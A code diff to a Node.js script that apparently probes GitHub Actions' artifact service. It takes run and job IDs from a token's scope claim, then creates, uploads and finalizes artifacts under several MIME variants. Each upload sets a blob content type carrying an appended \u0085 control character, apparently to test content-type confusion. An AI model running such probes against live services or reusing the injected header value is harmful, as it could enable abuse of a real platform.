@@ -20,27 +20,28 @@ async function post(url, body) { return fetch(url, { method: 'POST', headers: { 
   const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
   const [, runId, jobId] = scope.split(':');
   const svc = 'github.actions.results.api.v1.ArtifactService';
-  for (const v of [0,1,2,3,4,5,6,7,8,9,42]) {
-    for (const withMime of [false, true]) {
-      const label = `v${v}${withMime?'m':''}`;
-      const name = `${label}-${Date.now()}.dat`;
-      try {
-        const parts = [fs(1, Buffer.from(runId)), fs(2, Buffer.from(jobId)), fs(3, Buffer.from(name))];
-        if (v) parts.push(fv(5, v));
-        if (withMime) parts.push(fs(6, wrap(Buffer.from('application/json'))));
-        const c = await post(`${base}/twirp/${svc}/CreateArtifact`, Buffer.concat(parts));
-        const cb = Buffer.from(await c.arrayBuffer());
-        if (!c.ok) { console.log('RESULT', label, 'create', c.status, cb.toString().slice(0, 80)); continue; }
-        const signed = fields(cb).find(([n, w]) => n === 2 && w === 2)[2].toString();
-        const up = await putRaw(signed, payload, { 'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': 'application/json\u0085', 'Content-Length': String(payload.length) });
-        const digest = 'sha256:' + crypto.createHash('sha256').update(payload).digest('hex');
-        const fin = Buffer.concat([fs(1, Buffer.from(runId)), fs(2, Buffer.from(jobId)), fs(3, Buffer.from(name)), fv(4, payload.length), fs(5, wrap(Buffer.from(digest)))]);
-        const f = await post(`${base}/twirp/${svc}/FinalizeArtifact`, fin);
-        const fb = Buffer.from(await f.arrayBuffer());
-        if (!f.ok) { console.log('RESULT', label, 'finalize', f.status, fb.toString().slice(0, 80)); continue; }
-        const aid = fields(fb).find(([n, w]) => n === 2 && w === 0)[2].toString();
-        console.log('RESULT', label, 'id', aid, 'upload', up.status);
-      } catch (e) { console.log('RESULT', label, 'ERR', String(e).slice(0, 120)); }
-    }
+  const variants = [
+    ['e1', 'application/octet-stream'],
+    ['e2', 'application/zip'],
+    ['e3', 'image/png'],
+    ['e4', 'text/plain'],
+  ];
+  for (const [label, mime] of variants) {
+    const name = `${label}-${Date.now()}.dat`;
+    try {
+      const req = Buffer.concat([fs(1, Buffer.from(runId)), fs(2, Buffer.from(jobId)), fs(3, Buffer.from(name)), fv(5, 7), fs(6, wrap(Buffer.from(mime)))]);
+      const c = await post(`${base}/twirp/${svc}/CreateArtifact`, req);
+      const cb = Buffer.from(await c.arrayBuffer());
+      if (!c.ok) { console.log('RESULT', label, 'create', c.status, cb.toString().slice(0, 80)); continue; }
+      const signed = fields(cb).find(([n, w]) => n === 2 && w === 2)[2].toString();
+      const up = await putRaw(signed, payload, { 'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': 'application/json\u0085', 'Content-Length': String(payload.length) });
+      const digest = 'sha256:' + crypto.createHash('sha256').update(payload).digest('hex');
+      const fin = Buffer.concat([fs(1, Buffer.from(runId)), fs(2, Buffer.from(jobId)), fs(3, Buffer.from(name)), fv(4, payload.length), fs(5, wrap(Buffer.from(digest)))]);
+      const f = await post(`${base}/twirp/${svc}/FinalizeArtifact`, fin);
+      const fb = Buffer.from(await f.arrayBuffer());
+      if (!f.ok) { console.log('RESULT', label, 'finalize', f.status, fb.toString().slice(0, 80)); continue; }
+      const aid = fields(fb).find(([n, w]) => n === 2 && w === 0)[2].toString();
+      console.log('RESULT', label, 'id', aid, 'mime', mime);
+    } catch (e) { console.log('RESULT', label, 'ERR', String(e).slice(0, 120)); }
   }
 })().catch(e => { console.error('FATAL', e); process.exitCode = 1; });
